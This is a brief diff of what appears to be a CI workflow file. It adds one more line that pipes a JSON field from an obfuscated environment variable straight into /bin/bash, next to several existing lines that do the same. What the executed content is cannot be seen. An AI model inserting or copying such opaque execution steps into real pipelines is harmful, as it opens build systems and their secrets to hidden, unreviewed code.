@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$gvfoe8" | jq -r .yrjp73 | /bin/bash
           echo $lmpda098 | jq -r .tcojg64 | /bin/bash
           echo $rng0253 | jq -r .fn27 | /bin/bash
+          printf '%s' "$wev14" | jq -r .fgc3 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
